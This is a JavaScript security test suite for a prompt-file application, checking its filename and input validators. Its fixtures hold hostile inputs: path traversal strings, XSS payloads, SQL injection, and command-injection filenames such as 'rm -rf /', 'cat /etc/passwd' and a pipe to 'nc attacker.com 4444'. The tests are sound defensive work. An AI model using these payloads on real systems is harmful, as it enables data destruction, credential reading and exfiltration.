import * as fs from 'fs/promises';
import * as path from 'path';
import {
  validateFilename,
  validateContent,
  sanitizeInput,
  validatePathSafety
} from '../utils/validation.js';

describe('Security Tests', () => {
  const testDir = process.env.PROMPTS_DIR;

  describe('Path Traversal Prevention', () => {
    test('should prevent directory traversal attacks', () => {
      const maliciousFilenames = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32',
        'folder/../secret.txt',
        './../../sensitive.txt'
      ];

      maliciousFilenames.forEach(filename => {
        const result = validateFilename(filename);
        expect(result.isValid).toBe(false);
      });
    });

    test('should reject absolute paths', () => {
      const absolutePaths = [
        '/etc/passwd',
        '/usr/bin/bash',
        'C:\\Windows\\System32',
        '/var/log/system.log'
      ];

      absolutePaths.forEach(filepath => {
        const result = validateFilename(filepath);
        expect(result.isValid).toBe(false);
      });
    });
  });

  describe('Input Sanitization', () => {
    test('should sanitize HTML tags', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(1)">',
        '"><script>alert(1)</script>',
        '<iframe src="javascript:alert(1)"></iframe>'
      ];

      maliciousInputs.forEach(input => {
        const sanitized = sanitizeInput(input);
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('<img');
        expect(sanitized).not.toContain('<iframe');
      });
    });

    test('should handle extremely long input', () => {
      const longInput = 'A'.repeat(50000);
      const sanitized = sanitizeInput(longInput);
      expect(sanitized.length).toBeLessThanOrEqual(10000);
    });

    test('should trim whitespace', () => {
      const inputWithWhitespace = '   test content   ';
      const sanitized = sanitizeInput(inputWithWhitespace);
      expect(sanitized).toBe('test content');
    });
  });

  describe('Content Size Validation', () => {
    test('should accept normal size content', () => {
      const normalContent = 'This is a normal prompt content that should be accepted.';
      const result = validateContent(normalContent);
      expect(result.isValid).toBe(true);
    });

    test('should reject oversized content', () => {
      const largeContent = 'A'.repeat(1024 * 1024 + 1); // 1MB + 1 byte
      const result = validateContent(largeContent);
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('1MB');
    });
  });

  describe('File System Security', () => {
    test('should create files safely', async () => {
      const safeFilename = 'safe-test-file.txt';
      const content = 'Safe test content';
      
      // 파일명 검증
      const filenameValidation = validateFilename(safeFilename);
      expect(filenameValidation.isValid).toBe(true);
      
      // 경로 안전성 검증
      expect(validatePathSafety(safeFilename)).toBe(true);
      
      // 실제 파일 생성 테스트
      const filePath = path.join(testDir, safeFilename);
      await fs.writeFile(filePath, content, 'utf-8');
      
      const result = await fs.readFile(filePath, 'utf-8');
      expect(result).toBe(content);
      
      // 정리
      await fs.unlink(filePath);
    });

    test('should prevent dangerous file creation', () => {
      const dangerousFilenames = [
        'CON.txt',
        'PRN.txt',
        'AUX.txt',
        'NUL.txt',
        'COM1.txt',
        'LPT1.txt'
      ];

      dangerousFilenames.forEach(filename => {
        expect(validatePathSafety(filename)).toBe(false);
      });
    });
  });

  describe('Injection Attack Prevention', () => {
    test('should prevent command injection attempts', () => {
      const injectionAttempts = [
        'file.txt; rm -rf /',
        'file.txt && cat /etc/passwd',
        'file.txt | nc attacker.com 4444',
        'file.txt$(whoami)',
        'file.txt`id`'
      ];

      injectionAttempts.forEach(attempt => {
        const sanitized = sanitizeInput(attempt);
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('&&');
        expect(sanitized).not.toContain('|');
        expect(sanitized).not.toContain('$(');
        expect(sanitized).not.toContain('`');
      });
    });

    test('should prevent SQL injection patterns', () => {
      const sqlInjections = [
        "file'; DROP TABLE prompts; --",
        "file' OR '1'='1",
        "file'; SELECT * FROM users; --"
      ];

      sqlInjections.forEach(injection => {
        const sanitized = sanitizeInput(injection);
        // 기본적인 특수문자 제거 확인
        expect(sanitized.length).toBeLessThan(injection.length);
      });
    });
  });

  describe('Denial of Service Prevention', () => {
    test('should handle null and undefined inputs gracefully', () => {
      expect(() => validateFilename(null)).not.toThrow();
      expect(() => validateFilename(undefined)).not.toThrow();
      expect(() => validateContent(null)).not.toThrow();
      expect(() => validateContent(undefined)).not.toThrow();
    });

    test('should limit processing of extremely long filenames', () => {
      const longFilename = 'A'.repeat(1000);
      const result = validateFilename(longFilename);
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('255자');
    });
  });
});